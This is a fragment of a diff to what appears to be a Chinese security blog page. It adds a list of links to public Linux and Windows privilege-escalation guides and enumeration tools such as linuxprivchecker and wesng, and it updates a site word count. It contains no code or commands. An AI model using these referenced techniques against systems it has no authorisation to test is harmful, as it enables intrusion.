+<p><strong>2、linux提权方法汇总</strong>：<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
+<p><strong>3、windows提权方法汇总1</strong>：<a href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">https://www.fuzzysecurity.com/tutorials/16.html</a></p>
+<p><strong>4、windows提权方法汇总2</strong>：<a href="https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md" target="_blank" rel="noopener">https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md</a></p>
+<p><strong>5、Linux提权辅助脚本1</strong>：<a href="https://www.securitysift.com/download/linuxprivchecker.py" target="_blank" rel="noopener">https://www.securitysift.com/download/linuxprivchecker.py</a></p>
+<p><strong>6、linux提权辅助脚本2</strong>：<a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
+<p><strong>7、Windows提权辅助脚本</strong>：<a href="https://github.com/pentestmonkey/windows-privesc-check" target="_blank" rel="noopener">https://github.com/pentestmonkey/windows-privesc-check</a></p>
+<p><strong>8、Windows提权辅助辅助工具</strong>：<a href="https://github.com/bitsadmin/wesng" target="_blank" rel="noopener">https://github.com/bitsadmin/wesng</a></p>
 
             </div>
             <hr/>
@@ -1746,7 +1939,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">42.4k</span>&nbsp;字
+                class="white-color">46.1k</span>&nbsp;字
             
             
             
